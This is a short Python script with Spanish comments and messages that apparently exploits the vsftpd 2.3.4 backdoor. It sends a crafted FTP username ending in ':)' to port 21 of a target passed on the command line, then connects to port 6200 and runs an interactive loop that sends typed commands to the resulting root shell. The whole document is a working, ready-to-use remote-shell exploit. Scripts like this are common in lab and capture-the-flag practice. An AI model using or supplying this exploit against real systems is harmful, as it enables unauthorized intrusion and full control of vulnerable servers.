import socket
import sys
import time

target = sys.argv[1]

print(f"[*] Conectando a {target}:21 para activar backdoor...")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target, 21))
s.recv(1024) # Recibir banner
s.send(b"USER root:)\r\n")
s.send(b"PASS x\r\n")
s.close()

print("[*] Backdoor activado. Conectando a la shell en puerto 6200...")
time.sleep(1)

s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s2.connect((target, 6200))
    print("[+] ¡Shell obtenida! Escribe comandos (ej: whoami)")
    while True:
        cmd = input("# ")
        s2.send(cmd.encode() + b"\n")
        print(s2.recv(4096).decode(), end="")
except ConnectionRefusedError:
    print("[-] Error: No se pudo conectar al puerto 6200. El backdoor no está activo o está bloqueado.")
